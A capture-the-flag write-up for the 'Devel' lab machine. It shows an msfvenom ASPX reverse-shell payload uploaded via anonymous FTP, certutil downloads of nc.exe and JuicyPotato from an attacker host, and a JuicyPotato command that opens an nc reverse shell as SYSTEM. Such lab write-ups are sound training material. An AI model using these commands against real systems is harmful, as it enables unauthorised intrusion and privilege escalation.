## Devel

Difficulty: Easy

### User and Root Flag

Rustscan return to us port 21 and 80 as open.

```
rustscan -a 10.10.10.5 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/7a6debd3-f538-4619-b1b0-974c796edcf2)

<br>

As we can see, FTP is enabled to login with anonymous.

Also, port 80 has Microsoft ISS as webserver.

![ftp](https://github.com/b1d0ws/OSCP/assets/58514930/409130b8-d30d-4620-9c34-ab7539362a13)

<br>

Inside FTP, we see that the directory shared is the website root directory.  

We can generate a payload with msfvenom, upload to ftp and execute it accessing directly on the webserver.

```
msfvenom -p windows/shell_reverse_tcp -f aspx lhost=10.10.14.21 lport=4444 > shell.aspx

ftp 10.10.10.5
put shell.aspx
```

![uploadFTP](https://github.com/b1d0ws/OSCP/assets/58514930/a5eeee9b-8904-4ebc-8a48-c89248f65124)

#### Privilege Escalation

Enumeration privileges, we see that our user has SeImpersonatePrivilege, so we can abuse [JuicyPotato](https://github.com/ohpe/juicy-potato) here.

```
whoami /priv
```

![enumeratingPrivilege](https://github.com/b1d0ws/OSCP/assets/58514930/ce03aa5e-2729-46a6-be3b-c9641a210880)

<br>

Upload nc execute the reverse shell with it and the JuicyPotato x86 version to the machine.

```
cp /usr/share/windows-resources/binaries/nc.exe .
certutil -urlcache -f http://10.10.14.21/nc.exe nc.exe

certutil -urlcache -f http://10.10.14.21/JuicyPotatox86.exe JuicyPotatox86.exe

JuicyPotatox86.exe -l 4444 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe -e cmd.exe 10.10.14.21 1337" -t *
```

![privilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/3a4a3c2d-f184-42ec-8339-22cf977a727f)
